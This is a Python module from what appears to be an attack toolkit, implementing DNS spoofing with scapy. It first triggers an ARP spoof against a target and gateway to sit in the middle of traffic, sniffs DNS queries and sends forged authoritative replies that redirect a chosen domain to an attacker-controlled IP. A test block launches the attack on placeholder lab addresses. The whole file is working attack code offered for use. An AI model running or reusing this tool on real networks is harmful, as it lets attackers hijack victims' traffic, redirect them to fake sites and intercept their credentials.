
""" src/attacks/dns_spoofing.py: Module for DNS spoofing attack.

"""
import threading
from scapy.all import sniff, sendp, Ether, IP, UDP, DNS, DNSQR, DNSRR

from ..attacks.arp_spoofing import start_arp_spoof, stop_arp_spoof


class DnsSpoofingAttack:
    """
    Manages a DNS spoofing attack.

    """

    def __init__(self, domain: str, fake_ip: str, target_ip: str, gateway_ip: str):
        """
        Initializes the DNS spoofing attack.

        Args:
            domain (str): The domain name to spoof.
            fake_ip (str): The IP address to use in the spoofed response.
            target_ip (str): The victim's IP address.
            gateway_ip (str): The gateway's IP address.
        """
        self.spoof_rules = {domain: fake_ip}
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.running = False
        self.sniffing_thread = None

    def _dns_interceptor(self, packet):
        """
        Callback function to process sniffed DNS packets.
        """
        if packet.haslayer(DNS) and packet[DNS].opcode == 0 and packet[DNS].ancount == 0:
            queried_domain = packet[DNSQR].qname.decode('utf-8').strip('.')

            if queried_domain in self.spoof_rules:
                fake_ip = self.spoof_rules[queried_domain]
                print(f"[INFO] Intercepted DNS query for {queried_domain}. Spoofing to {fake_ip}")

                spoofed_response = (
                    Ether(src=packet[Ether].dst, dst=packet[Ether].src) /
                    IP(src=packet[IP].dst, dst=packet[IP].src) /
                    UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) /
                    DNS(
                        id=packet[DNS].id,
                        qr=1, aa=1,
                        qd=packet[DNS].qd,
                        an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=fake_ip)
                    )
                )
                sendp(spoofed_response, verbose=0)
                print(f"[SUCCESS] Sent spoofed response for {queried_domain} to {packet[IP].src}")

    def _sniff_loop(self):
        """
        The main loop for the sniffing thread.
        """
        print("[INFO] Starting DNS sniffer...")
        while self.running:
            sniff(filter="udp port 53", prn=self._dns_interceptor, store=0, stop_filter=lambda p: not self.running)

    def start(self):
        """
        Starts the DNS spoofing attack in a separate thread.
        """
        if not self.running:
            self.running = True
            print("[INFO] Starting prerequisite ARP spoof...")
            start_arp_spoof(self.target_ip, self.gateway_ip)

            self.sniffing_thread = threading.Thread(target=self._sniff_loop)
            self.sniffing_thread.start()
            print("[INFO] DNS spoofing attack started.")

    def stop(self):
        """
        Stops the DNS spoofing attack.
        """
        if self.running:
            print("[INFO] Stopping ARP spoof...")
            stop_arp_spoof()
            
            self.running = False
            if self.sniffing_thread and self.sniffing_thread.is_alive():
                self.sniffing_thread.join()  # Wait for the thread to finish
            print("[INFO] DNS spoofing attack stopped.")

# For direct testing of the module
if __name__ == '__main__':
    print("Testing DNS spoofer...")
    # The attacker needs to be in a MitM position for this to work.
    try:
        # Spoof 'example.com' to an attacker-controlled IP
        attack = DnsSpoofingAttack(
            domain="example.com", 
            fake_ip="10.0.2.6",
            target_ip="10.0.0.10", # Placeholder for testing
            gateway_ip="10.0.0.1"  # Placeholder for testing
        )
        attack.start()
        print("Attack started. Press Ctrl+C to stop.")
        # Keep the main thread alive
        while True:
            pass
    except KeyboardInterrupt:
        print("\nStopping attack...")
        attack.stop()
        print("Attack stopped.")